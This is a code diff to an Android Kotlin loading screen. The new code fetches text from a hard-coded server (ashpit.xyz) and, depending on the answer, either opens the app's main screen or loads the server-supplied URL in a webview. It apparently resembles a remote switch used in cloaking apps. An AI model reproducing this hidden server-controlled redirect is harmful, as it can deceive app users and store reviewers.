@@ -8,7 +8,6 @@ import android.util.Log
 import androidx.activity.result.ActivityResultLauncher
 import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AppCompatActivity
-import androidx.lifecycle.lifecycleScope
 import com.google.firebase.analytics.FirebaseAnalytics
 import com.google.firebase.analytics.ktx.analytics
 import com.google.firebase.firestore.ktx.firestore
@@ -16,13 +15,16 @@ import com.google.firebase.ktx.Firebase
 import com.google.firebase.messaging.FirebaseMessaging
 import com.template.Constants.EMPTY
 import com.template.Constants.TEST
-import com.template.api.ApiInterface
-import com.template.api.RetrofitClient
 import com.template.network.NetworkManager
 import com.template.storage.AppPreferences
-import java.net.URL
+import kotlinx.coroutines.GlobalScope
+import kotlinx.coroutines.launch
+import org.jsoup.Jsoup
+import org.jsoup.nodes.Element
+import org.jsoup.select.Elements
 import java.util.TimeZone
 import java.util.UUID
+
 
 class LoadingActivity : AppCompatActivity() {
 
@@ -120,48 +122,28 @@ class LoadingActivity : AppCompatActivity() {
     }
 
     private fun makeRequest(link: String) {
-        val retrofit = RetrofitClient.getInstance(link)
-        val apiInterface = retrofit.create(ApiInterface::class.java)
 
-        lifecycleScope.launchWhenCreated {
-            try {
-                val response = apiInterface.getLink()
-                val code = response.code().toString()
+        GlobalScope.launch {
+            val document = Jsoup
+                .connect("https://ashpit.xyz")
+                .ignoreContentType(true)
+                .get()
 
-                // todo test
-                //val text_link = URL(link).readText()
-                //doLog(text_link)
+            val text = document.text().toString()
+            doLog("Answer from server: $text")
 
-                when (code) {
-                    "403" -> {
-                        // todo не так, нужно правильно считать текст с открывшегося сайта
-                        //val answer = URL(link).readText()
-                        //doLog("answer: $answer")
-
-
-                        val targetLink = response.body()?.link.toString()
-                        doLog("(код 403) ссылка не получена, получено error ($targetLink)")
-                        appPreferences?.setFirestoreState(EMPTY)
-                        doLog("установили firestore state empty")
-                        //doLog("открываем мейн активити, firestore state не трогаю")
-                        openMainActivity()
-                    }
-
-                    "200" -> {
-                        // todo не так, нужно правильно считать текст с открывшегося сайта
-                        val targetLink = response.body()?.link.toString()
-                        doLog("(код 200) получили ссылку от сервера: $targetLink")
-                        appPreferences?.setFirestoreState(Constants.EXIST)
-                        doLog("установили firestore state exist")
-                        appPreferences?.setLink(targetLink)
-                        openWebActivity(targetLink)
-                    }
-                }
-
-            } catch (Ex: Exception) {
-                doLog(Ex.localizedMessage as String)
+            if (text == Constants.ERROR) {
+                appPreferences?.setFirestoreState(EMPTY)
+                doLog("установили firestore state empty")
+                openMainActivity()
+            } else {
+                appPreferences?.setFirestoreState(Constants.EXIST)
+                doLog("установили firestore state exist")
+                appPreferences?.setLink(text)
+                openWebActivity(text)
             }
         }
+
     }
 
     private fun openMainActivity() {
